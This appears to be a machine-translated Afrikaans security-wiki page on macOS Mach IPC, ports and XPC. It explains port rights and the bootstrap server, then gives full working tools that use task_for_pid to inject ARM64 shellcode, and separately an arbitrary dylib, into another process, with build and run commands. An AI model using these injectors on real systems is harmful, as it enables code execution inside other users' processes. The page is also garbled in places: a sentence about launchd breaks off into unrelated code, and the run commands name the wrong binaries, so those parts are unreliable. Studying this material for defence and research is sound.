# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach boodskappe via Poorte

### Basiese Inligting

Mach gebruik **take** as die **kleinste eenheid** vir die deel van hulpbronne, en elke taak kan **meerdere drade** bevat. Hierdie **take en drade is 1:1 gekarteer na POSIX prosesse en drade**.

Kommunikasie tussen take vind plaas via Mach Inter-Process Communication (IPC), wat eenrigting kommunikasiekanale benut. **Boodskappe word tussen poorte oorgedra**, wat optree soos **boodskap rye** wat deur die kernel bestuur word.

Elke proses het 'n **IPC tabel**, waar dit moontlik is om die **mach poorte van die proses** te vind. Die naam van 'n mach poort is eintlik 'n nommer (n aanduiding na die kernel objek).

'n Proses kan ook 'n poortnaam met sekere regte **na 'n ander taak** stuur en die kernel sal hierdie inskrywing in die **IPC tabel van die ander taak** laat verskyn.

### Poort Regte

Poort regte, wat definieer watter operasies 'n taak kan uitvoer, is sleutel tot hierdie kommunikasie. Die moontlike **poort regte** is ([definisies hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Ontvang reg**, wat die ontvangs van boodskappe wat na die poort gestuur word, toelaat. Mach poorte is MPSC (meerdere produsente, enkele verbruiker) rye, wat beteken dat daar slegs **een ontvang reg vir elke poort** in die hele stelsel mag wees (in teenstelling met pype, waar meerdere prosesse almal lêer beskrywings na die lees einde van een pyp kan hou).
- 'n **taak met die Ontvang** reg kan boodskappe ontvang en **Stuur regte** skep, wat dit toelaat om boodskappe te stuur. Oorspronklik het slegs die **eie taak die Ontvang reg oor sy poort**.
- **Stuur reg**, wat die stuur van boodskappe na die poort toelaat.
- Die Stuur reg kan **gekloneer** word sodat 'n taak wat 'n Stuur reg besit die reg kan kloneer en **aan 'n derde taak kan toeken**.
- **Stuur-eens reg**, wat die stuur van een boodskap na die poort toelaat en dan verdwyn.
- **Poort stel reg**, wat 'n _poort stel_ aandui eerder as 'n enkele poort. Dequeuing 'n boodskap van 'n poort stel dequeues 'n boodskap van een van die poorte wat dit bevat. Poort stelle kan gebruik word om op verskeie poorte gelyktydig te luister, baie soos `select`/`poll`/`epoll`/`kqueue` in Unix.
- **Dood naam**, wat nie 'n werklike poort reg is nie, maar bloot 'n plekhouer. Wanneer 'n poort vernietig word, draai alle bestaande poort regte na die poort in dood name.

**Take kan STUUR regte aan ander oordra**, wat hulle in staat stel om boodskappe terug te stuur. **STUUR regte kan ook geklonen word, sodat 'n taak die reg kan dupliceer en aan 'n derde taak kan gee**. Dit, saam met 'n intermediêre proses bekend as die **bootstrap bediener**, stel effektiewe kommunikasie tussen take in staat.

### Lêer Poorte

Lêer poorte laat toe om lêer beskrywings in Mac poorte te enkapsuleer (met behulp van Mach poort regte). Dit is moontlik om 'n `fileport` van 'n gegewe FD te skep met `fileport_makeport` en 'n FD van 'n fileport te skep met `fileport_makefd`.

### Vestiging van 'n kommunikasie

#### Stappe:

Soos genoem, om die kommunikasiekanaal te vestig, is die **bootstrap bediener** (**launchd** in mac) betrokke.

1. Taak **A** begin 'n **nuwe poort**, en verkry 'n **ONTVAAG reg** in die proses.
2. Taak **A**, as die houer van die ONTVANG reg, **genereer 'n STUUR reg vir die poort**.
3. Taak **A** vestig 'n **verbinding** met die **bootstrap bediener**, wat die **poort se diensnaam** en die **STUUR reg** deur 'n prosedure bekend as die bootstrap registrasie verskaf.
4. Taak **B** interaksie met die **bootstrap bediener** om 'n bootstrap **soektog vir die diens** naam uit te voer. As dit suksesvol is, **dupliseer die bediener die STUUR reg** wat van Taak A ontvang is en **stuur dit na Taak B**.
5. Na die verkryging van 'n STUUR reg, is Taak **B** in staat om 'n **boodskap** te **formuleer** en dit **na Taak A** te stuur.
6. Vir 'n bi-rigting kommunikasie genereer taak **B** gewoonlik 'n nuwe poort met 'n **ONTVAAG** reg en 'n **STUUR** reg, en gee die **STUUR reg aan Taak A** sodat dit boodskappe na TAak B kan stuur (bi-rigting kommunikasie).

Die bootstrap bediener **kan nie die diensnaam wat deur 'n taak geclaim word, verifieer nie**. Dit beteken 'n **taak** kan potensieel **enige stelsel taak naboots**, soos valslik **'n magtiging diensnaam te claim** en dan elke versoek goedkeur.

Dan, stoor Apple die **name van stelsel-gelewerde dienste** in veilige konfigurasie lêers, geleë in **SIP-beskermde** gidse: `/System/Library/LaunchDaemons` en `/System/Library/LaunchAgents`. Saam met elke diensnaam, word die **geassosieerde binêre ook gestoor**. Die bootstrap bediener sal 'n **ONTVAAG reg vir elkeen van hierdie diensname** skep en hou.

Vir hierdie vooraf gedefinieerde dienste, verskil die **soek proses effens**. Wanneer 'n diensnaam gesoek word, begin launchd
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Proses wat 'n _**ontvangsreg**_ besit, kan boodskappe op 'n Mach-poort ontvang. Omgekeerd, die **stuurders** word 'n _**stuur**_ of 'n _**stuur-eens reg**_ toegeken. Die stuur-eens reg is uitsluitlik vir die stuur van 'n enkele boodskap, waarna dit ongeldig word.

Om 'n maklike **tweeduidige kommunikasie** te bereik, kan 'n proses 'n **mach-poort** in die mach **boodskapkop** spesifiseer wat die _antwoordpoort_ (**`msgh_local_port`**) genoem word, waar die **ontvanger** van die boodskap 'n **antwoord** op hierdie boodskap kan **stuur**. Die bitvlagte in **`msgh_bits`** kan gebruik word om aan te ** dui** dat 'n **stuur-eens** **reg** afgelei en oorgedra moet word vir hierdie poort (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

> [!TIP]
> Let daarop dat hierdie soort tweeduidige kommunikasie gebruik word in XPC-boodskappe wat 'n herhaling verwag (`xpc_connection_send_message_with_reply` en `xpc_connection_send_message_with_reply_sync`). Maar **gewoonlik word verskillende poorte geskep** soos voorheen verduidelik om die tweeduidige kommunikasie te skep.

Die ander velde van die boodskapkop is:

- `msgh_size`: die grootte van die hele pakket.
- `msgh_remote_port`: die poort waarop hierdie boodskap gestuur word.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: die ID van hierdie boodskap, wat deur die ontvanger geïnterpreteer word.

> [!CAUTION]
> Let daarop dat **mach boodskappe oor 'n \_mach-poort**\_ gestuur word, wat 'n **enkele ontvanger**, **meervoudige stuurder** kommunikasiekanaal is wat in die mach-kern ingebou is. **Meervoudige prosesse** kan **boodskappe stuur** na 'n mach-poort, maar op enige tydstip kan slegs **'n enkele proses lees** daarvan.

### Tel poorte
```bash
lsmp -p <pid>
```
U kan hierdie hulpmiddel op iOS installeer deur dit af te laai van [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Kode voorbeeld

Let op hoe die **sender** 'n poort **toewys**, 'n **send right** vir die naam `org.darlinghq.example` skep en dit na die **bootstrap server** stuur terwyl die sender vir die **send right** van daardie naam gevra het en dit gebruik het om 'n **boodskap** te **stuur**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

### Bevoorregte Poorte

- **Gashostpoort**: As 'n proses **Stuur** voorreg oor hierdie poort het, kan hy **inligting** oor die **stelsel** verkry (bv. `host_processor_info`).
- **Gashostprivpoort**: 'n Proses met **Stuur** reg oor hierdie poort kan **bevoorregte aksies** uitvoer soos om 'n kernuitbreiding te laai. Die **proses moet root wees** om hierdie toestemming te verkry.
- Boonop, om die **`kext_request`** API aan te roep, is dit nodig om ander regte **`com.apple.private.kext*`** te hê wat slegs aan Apple binêre gegee word.
- **Taaknaampoort:** 'n Onbevoorregte weergawe van die _taakpoort_. Dit verwys na die taak, maar laat nie toe om dit te beheer nie. Die enigste ding wat blykbaar deur dit beskikbaar is, is `task_info()`.
- **Taakpoort** (ook bekend as kernpoort)**:** Met Stuur toestemming oor hierdie poort is dit moontlik om die taak te beheer (lees/skryf geheue, skep drade...).
- Roep `mach_task_self()` aan om die **naam** vir hierdie poort vir die oproeper taak te verkry. Hierdie poort word slegs **geërf** oor **`exec()`**; 'n nuwe taak wat met `fork()` geskep word, kry 'n nuwe taakpoort (as 'n spesiale geval, kry 'n taak ook 'n nuwe taakpoort na `exec()` in 'n suid binêre). Die enigste manier om 'n taak te spawn en sy poort te verkry, is om die ["poortruil dans"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) uit te voer terwyl 'n `fork()` gedoen word.
- Dit is die beperkings om toegang tot die poort te verkry (van `macos_task_policy` van die binêre `AppleMobileFileIntegrity`):
- As die app die **`com.apple.security.get-task-allow` regte** het, kan prosesse van die **dieselfde gebruiker toegang tot die taakpoort** verkry (gewoonlik deur Xcode vir foutopsporing bygevoeg). Die **notariserings** proses sal dit nie toelaat vir produksievrystellings nie.
- Apps met die **`com.apple.system-task-ports`** regte kan die **taakpoort vir enige** proses verkry, behalwe die kern. In ouer weergawes is dit **`task_for_pid-allow`** genoem. Dit word slegs aan Apple toepassings toegestaan.
- **Root kan toegang tot taakpoorte** van toepassings **nie** saamgestel met 'n **versterkte** tydren (en nie van Apple) verkry nie.

### Shellcode Inspuiting in draad via Taakpoort

Jy kan 'n shellcode van:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Kompileer** die vorige program en voeg die **toelaes** by om kode met dieselfde gebruiker in te spuit (as nie, sal jy **sudo** moet gebruik).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Dylib Inspuiting in draad via Taak port

In macOS **draad** kan gemanipuleer word via **Mach** of deur gebruik te maak van **posix `pthread` api**. Die draad wat ons in die vorige inspuiting gegenereer het, is gegenereer met die Mach api, so **dit is nie posix-konform nie**.

Dit was moontlik om **'n eenvoudige shellcode** in te spuit om 'n opdrag uit te voer omdat dit **nie met posix** konforme apis moes werk nie, net met Mach. **Meer komplekse inspuitings** sou vereis dat die **draad** ook **posix-konform** moet wees.

Daarom, om die **draad** te **verbeter**, moet dit **`pthread_create_from_mach_thread`** aanroep wat **'n geldige pthread** sal skep. Dan kan hierdie nuwe pthread **dlopen** aanroep om **'n dylib** van die stelsel te laai, sodat dit in plaas daarvan om nuwe shellcode te skryf om verskillende aksies uit te voer, moontlik is om pasgemaakte biblioteke te laai.

Jy kan **voorbeeld dylibs** vind in (byvoorbeeld die een wat 'n log genereer en dan kan jy daarnaar luister):

{{#ref}}
../../macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Draad Oorname via Taakpoort <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In hierdie tegniek word 'n draad van die proses oor geneem:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md
{{#endref}}

## XPC

### Basiese Inligting

XPC, wat staan vir XNU (die kern wat deur macOS gebruik word) inter-Proses Kommunikasie, is 'n raamwerk vir **kommunikasie tussen prosesse** op macOS en iOS. XPC bied 'n mekanisme vir die maak van **veilige, asynchrone metode-oproepe tussen verskillende prosesse** op die stelsel. Dit is 'n deel van Apple se sekuriteitsparadigma, wat die **skepping van privilige-geskeide toepassings** toelaat waar elke **komponent** loop met **slegs die regte wat dit nodig het** om sy werk te doen, en sodoende die potensiële skade van 'n gecompromitteerde proses beperk.

Vir meer inligting oor hoe hierdie **kommunikasie werk** en hoe dit **kwulnerabel kan wees**, kyk:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

